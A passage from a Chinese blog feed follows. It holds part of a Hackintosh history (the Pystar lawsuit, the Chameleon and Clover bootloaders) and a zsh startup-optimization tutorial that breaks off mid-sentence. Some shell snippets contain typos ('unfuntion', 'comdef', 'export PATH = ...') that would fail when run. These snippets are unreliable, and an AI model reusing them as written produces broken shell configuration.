公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 